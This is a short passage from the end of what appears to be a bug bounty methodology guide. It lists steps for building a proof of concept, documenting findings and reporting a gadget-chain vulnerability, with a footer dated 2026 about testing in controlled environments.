5. **Build PoC** — Start with harmless detection, escalate to RCE
6. **Document** — Screenshot everything, note exact payload and response
7. **Report** — Include gadget chain explanation for triage teams

---

*Generated for advanced bug bounty hunting and black-box security testing. Always validate findings in controlled environments before reporting.*

*Last updated: 2026-05-24*
